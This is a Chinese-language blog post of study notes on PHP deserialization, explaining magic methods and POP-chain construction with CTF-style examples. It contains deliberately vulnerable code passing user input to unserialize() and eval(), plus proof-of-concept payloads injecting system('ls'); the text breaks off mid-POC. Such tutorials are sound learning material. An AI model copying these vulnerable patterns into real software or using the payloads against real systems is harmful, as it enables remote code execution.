<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>2js56&#39;blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="2js56&#39;blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="2js56&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="[object Object]">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="2js56'blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">2js56&#39;blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-web基础漏洞之PHP反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/09/24/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2023-09-23T22:10:11.000Z" itemprop="datePublished">2023-09-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/09/24/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">web基础漏洞之PHP反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="反序列化学习"><a href="#反序列化学习" class="headerlink" title="反序列化学习"></a>反序列化学习</h1><p><strong>声明：该笔记中图片可能加载较慢，请耐心等待</strong></p>
<h3 id="构造函数-construct"><a href="#构造函数-construct" class="headerlink" title="构造函数__construct()"></a>构造函数__construct()</h3><p>构造函数，在实例化一个对象的时候，首先会去执行的一个方法；  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct($username)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        echo &quot;触发了构造函数一次&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User(&quot;张三&quot;);</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">unserialize($ser);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230922165620.png" alt="运行结果"><br>触发时机：实例化对象<br>功能：提前清理不必要内容<br>参数：非必要<br>返回值：  </p>
<h3 id="析构函数-destruct"><a href="#析构函数-destruct" class="headerlink" title="析构函数__destruct()"></a>析构函数__destruct()</h3><p>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">            echo &quot;触发了构造函数一次&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User(&quot;张三&quot;);</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">unserialize($ser);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230922170626.png" alt="运行结果"><br><code>$test = new User(&quot;张三&quot;);</code>:实例化对象后被销毁触发一次<br><code>$ser = serialize($test);</code> 序列化对象成字符串，对象变成了字符串不会被销毁，所以不会触发<br> <code>unserialize($ser);</code>：反序列成对象后销毁触发一次<br>例题：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot; ;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval ($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser = $_GET[&quot;benben&quot;];</span><br><span class="line">unserialize($ser);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>由于反序列后会自动触发__destruct()，所以我们只要控制cmd的值为我们想要执行的语句即可<br>则传入<code>?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;</code><br>unserialize()触发__destruct()<br>__destruct() 执行eval()<br>eval()触发代码<br>触发时机：对象引用完成，或对象被销毁<br>功能：<br>参数：<br>返回值：</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><p>序列化serialize()函数会先检查类中是否存在一个魔术方法__sleep()。<br>如果存在，该方法会先被调用，然后才执行序列化操作。<br>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。<br>如果该方法位返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。  </p>
<p>触发时机：序列化serialize()之前。<br>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。<br>参数：成员属性。<br>返回值：需要被序列化存储的成员属性。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    public function __construct($username, $nickname, $password)    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);</span><br><span class="line">var_dump($user);</span><br><span class="line">echo serialize($user);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230922174122.png" alt="运行结果"><br>可以看见创建对象时<code>password</code>是存在的而序列化后的<code>password</code>不见了，这是因为序列化之前触发了__sleep()，而__sleep()只返回了<code>username</code>和<code>nickname</code>。即__sleep()执行返回需要序列化的变量名，过滤掉不需要的变量。<br>触发时机：序列化serialize()之前<br>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。<br>参数：return array<br>返回值：需要的变量</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup()"></a>wakeup()</h3><p>unserialize()会检查是否存在一个__wakeup()方法。<br>如果存在，则会先调用__wakeup()方法，预先准备对象所需要的资源。<br>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<p><strong>__wakeup()在反序列化unserialize()之前</strong><br><strong>__destruct()在反序列化unserialize()之后</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($user_ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>user_ser</code>里面只有<code>username</code>和<code>nickname</code>但是反序列化之前会触发__wakeup()所以<code>password</code>也会被赋值且等于<code>username</code>。<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230922215251.png" alt="运行结果"><br>触发时机：反序列化unserialize()之前。<br>功能：<br>参数：<br>返回值：  包含password的赋值。  </p>
<h3 id="tostring"><a href="#tostring" class="headerlink" title="__tostring()"></a>__tostring()</h3><p>触发时机：把<strong>对象</strong> 当成<strong>字符串</strong>调用<br>功能：<br>参数：<br>返回值：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    var $benben = &quot;this is test!!&quot;;</span><br><span class="line">         public function __toString()</span><br><span class="line">         &#123;</span><br><span class="line">             return &#x27;格式不对，输出不了!&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">print_r($test);</span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $test;</span><br><span class="line">?&gt;</span><br><span class="line">```  </span><br><span class="line">**User Object ( [benben] =&gt; this is test!! )  </span><br><span class="line">格式不对，输出不了!**  </span><br><span class="line">把类`User`实体化并赋值给`$test`,此时`$test`是个对象，调用对象可以使用`print_r`或者`var_dump`正常打印对象输出，如果使用`echo`或者`print`只能调用字符串的方式去调用对象，即把对象当初字符串使用，此时自动触发toString()。  </span><br><span class="line">### __invoke()</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    var $benben = "this is test!!";
         public function __invoke()
         {
             echo  '它不是个函数!';
          }
}
$test = new User() ;
echo $test ->benben;
echo "<br />";
echo $test() ->benben;
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">**this is test!!  </span><br><span class="line">它不是个函数!**  </span><br><span class="line">  </span><br><span class="line">把类User实体化并赋值给`$test`为对象，正常输出对象里的值benben，加上()是把test当成函数`test()`来调用，此时触发invoke()。</span><br><span class="line"></span><br><span class="line">### __call()</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    public function __call($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
          }
}
$test = new User() ;
$test -> callxxx('a');
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**callxxx,a**  </span><br><span class="line">调用的方法callxxx()不存在，触发魔术方法call()</span><br><span class="line"></span><br><span class="line">触发时机：调用一个不存在的方法</span><br><span class="line">功能：</span><br><span class="line">参数：2个参数传参`$arg1`（名称）,`$arg2`（参数）</span><br><span class="line">返回值： 调用的不存在的方法的名称和参数  </span><br><span class="line">### __callStatic()</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class User {
    public function __callStatic($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
          }
}
$test = new User() ;
$test::callxxx('a');
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**callxxx,a**  </span><br><span class="line"></span><br><span class="line">调用的静态方法callxxx()不存在，触发魔术方法callStatic()</span><br><span class="line"></span><br><span class="line">触发时机：静态调用或调用成员常量时使用的方法不存在</span><br><span class="line">功能：</span><br><span class="line">参数：2个参数传参`$arg1`（名称）,`$arg2`（参数）</span><br><span class="line">返回值： 调用的不存在的方法的名称和参数</span><br><span class="line">### __get()</span><br><span class="line">```&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public function __get($arg1)</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test -&gt;var2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>var2</strong>  </p>
<p>调用的成员属性var2不存在，触发get()，把不存在的属性名称var2赋值给$arg1</p>
<p>触发时机：调用的成员属性不存在<br>功能：<br>参数：传参<code>$arg1</code>（名称）<br>返回值：不存在的成员属性的名称</p>
<h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public function __set($arg1 ,$arg2)</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1.&#x27;,&#x27;.$arg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test -&gt;var2=1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>var2,1</strong>  </p>
<p>给不存在的成员属性var2赋值为1，先触发get()，再触发set()<br><code>$arg1</code>,不存在成员属性的名称；<code>$arg2</code>，给不存在的成员属性var2赋的值  </p>
<p>触发时机：给不存在的成员属性赋值<br>功能：<br>参数：传参<code>$arg1</code>（名称），<code>$arg2</code>（值）<br>返回值：不存在的成员属性的名称和赋的值</p>
<h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __isset($arg1 )</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">isset($test-&gt;var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>var</strong>  </p>
<p>isset()调用的成员属性var不可访问或不存在</p>
<p>触发时机：对不可访问属性使用isset()或empty()时，__isset()会被调用<br>功能：<br>参数：传参<code>$arg1</code>（名称）<br>返回值：不存在的成员属性的名称</p>
<h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __unset($arg1 )</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">unset($test-&gt;var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>var</strong><br>unset()调用的成员属性var不可访问或不存在触发unset(),返回<code>$arg1</code>，不存在成员属性的名称。  </p>
<p>触发时机：对不可访问属性使用unset()<br>功能：<br>参数：传参<code>$arg1</code>（名称）<br>返回值：不存在的成员属性的名称</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __clone( )</span><br><span class="line">    &#123;</span><br><span class="line">        echo  &quot;__clone test&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$newclass = clone($test)</span><br><span class="line">?&gt;</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">**__clone test**  </span><br><span class="line">使用clone()克隆对象完成后，触发魔术方法__clone() </span><br><span class="line"></span><br><span class="line">触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()  </span><br><span class="line">功能：</span><br><span class="line">参数：</span><br><span class="line">返回值：</span><br><span class="line"></span><br><span class="line">## POP链前置知识</span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class index {
    private $test;
    public function __construct(){
        $this->test = new normal();
    }
    public function __destruct(){
        $this->test->action();
    }
}
class normal {
    public function action(){
        echo "please attack me";
    }
}
class evil {
    var $test2;
    public function action(){
        eval($this->test2);
    }
}
unserialize($_GET['test']);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关联点：如何让`$test`调用evil里的成员方法action()</span><br><span class="line">解题思路：给`$test`赋值为对象 test = new evil()</span><br><span class="line">1.反序列化unserialize()触发魔术方法destruct()  </span><br><span class="line">2.destruct()从`$test`调用action()  </span><br><span class="line"></span><br><span class="line">-2.eval()调用`$test2`  </span><br><span class="line">-1.可利用漏洞点在函数eval()，可执行命令  </span><br></pre></td></tr></table></figure>
<?php
class index {
    private $test;
    public function __construct(){
        $this->test = new evil();
    }
//     public function __destruct(){
//         $this->test->action();
//     }
}
// class normal {
//     public function action(){
//         echo "please attack me";
//     }
// }
class evil {
    var $test2 = "system('ls');";
    // public function action(){
    //     eval($this->test2);
    // }
}
$a = new index();
echo serialize($a);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**POC:**  </span><br></pre></td></tr></table></figure>
<p>?test&#x3D;O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:13:”system(%27ls%27);”;}}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">将`$test`赋值实例化对象test = new evil()  </span><br><span class="line">此时`$a`为实例化对象index()，其中成员属性`$test`=new evil()  </span><br><span class="line">`$test`为实例化对象evil()，成员属性`$test`=&quot;system(&#x27;ls&#x27;);&quot;;  </span><br><span class="line">  </span><br><span class="line">序列化只能序列化成员属性，不序列化成员方法  </span><br><span class="line">1. 构造命令语句  </span><br><span class="line">2. 实例化对象index()，自动调用__construct()  </span><br><span class="line">## POP链前置知识2</span><br><span class="line">**魔术方法触发前提：魔术方法所在类（或对象）被调用**</span><br><span class="line">![魔术方法触发时机](https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230923002043.png)  </span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class fast {
    public $source;
    public function __wakeup(){
        echo "wakeup is here!!";
        echo  $this->source;
    }
}
class sec {
    var $benben;
    public function __tostring(){
        echo "tostring is here!!";
    }
}
$a = 'O:3:"sec":1:{s:6:"benben";N;}';
unserialize($a);

?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反序列化的内容$a所调用的类sec()里不包含`__wakeup()`，故不会触发  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
class fast {
    public $source;
    public function __wakeup(){
        echo "wakeup is here!!";
        echo  $this->source;
    }
}
class sec {
    var $benben;
    public function __tostring(){
        echo "tostring is here!!";
    }
}
$b = $_GET['benben'];
unserialize($b);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">目标：显示&quot;tostring is here!!&quot;  </span><br><span class="line"></span><br><span class="line">-4 $source = object sec  </span><br><span class="line">-3 在echo中的source包含实例化sec()的对象  </span><br><span class="line">-2 把sec()实例化成对象后当成字符串输出  </span><br><span class="line">-1 需要触发__tostring()  </span><br></pre></td></tr></table></figure>
<?php
class fast {
    public $source;
}
class sec {
    var $benben;

}
$a = new fast();
$b = new sec();
$a->source = $b;
echo serialize($a);
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">**O:4:&quot;fast&quot;:1:&#123;s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;N;&#125;&#125;**  </span><br><span class="line">在对象`$a`里让source赋值对象`$b`,在触发wakeup后执行echo从而触发sec里的__tostring</span><br><span class="line">##  POP链构造及POC构造</span><br><span class="line">**POP链**  </span><br><span class="line">在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一个漏洞利用方法叫“面向属性编程”，即POP(Property Oriented Programming)。  </span><br><span class="line">POP链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload。  </span><br><span class="line">**POC编写**  </span><br><span class="line">POC（全称：Proof  of concept）中文译作概念验证。在安全界可以理解成漏洞验证程序。POC是一段不完整的程序，仅仅是为了验证提出者的观点的一段代码。  </span><br><span class="line">**例题：**  </span><br></pre></td></tr></table></figure>
<?php
//flag is in flag.php
highlight_file(__FILE__);
error_reporting(0);
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
?>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-1 目标：触发echo，调用`$flag`  </span><br><span class="line">-2 第一步：触发`invoke`，调用`append`，并使`$var=flag.php`  </span><br><span class="line">-3 `invoke`触发条件：把对象当成函数  </span><br><span class="line">-4 把`$p`赋值为对象，即`function`成为对象Modifier，却被当成函数调用，触发Modifier中的`invoke`  </span><br><span class="line">-5 触发`get`方法，（触发条件：调用不存在的成员属性）  </span><br><span class="line">-6 给`$str`赋值为对象Test，而Test中不存在成员属性source，则可触发Test里的成员方法get  </span><br><span class="line">-7 触发`toString`（触发条件：把对象当成字符串）  </span><br><span class="line">-8 给`$source`赋值为对象show，当成字符串被echo调用，触发`tostring`  </span><br><span class="line">-9 最终步：触发`wakeup`（反序列化unserialize）</span><br><span class="line"></span><br><span class="line">即当程序反序列化时，触发wakeup，而我们给source赋值为obj Show，所以这里会被Show这个对象当字符串echo，从而触发toString，而toString中的str被我们赋值为obj Test，此时str这个Test对象会调用Test中不存在的source成员属性从而触发get，由于get中p的值赋给了function，所以我们将p的值赋为obj Modifier，所以function就变成了一个对象，而`return $function();`则把一个对象当作了函数调用，触发Modifier中的invoke，从而调用append方法，我们将var的值设为flag.php，则flag.php被当作append方法的参数传给了value，从而`include(&#x27;flag.php&#x27;);`，然后执行`echo $flag`，得到我们想要的flag。  </span><br><span class="line">**POC:**</span><br></pre></td></tr></table></figure>
<?php
//flag is in flag.php
class Modifier {
